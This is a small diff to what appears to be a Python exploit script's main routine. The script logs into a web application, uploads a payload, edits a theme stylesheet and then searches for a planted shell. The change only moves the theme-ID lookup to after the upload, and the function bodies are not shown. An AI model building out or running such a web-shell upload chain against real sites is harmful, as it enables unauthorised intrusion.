@@ -85,8 +85,8 @@ if __name__ == '__main__':
 
 	cookies = getCookies(host,username,password)
 	key = getKey(host,cookies)
-	tid = getThemeID(host,cookies)
-
+	
 	upload(host,cookies,key,payload)
+	tid = getThemeID(host,cookies)
 	editStylesheet(host,cookies,tid,key,filename)
 	findShell(host,filename)
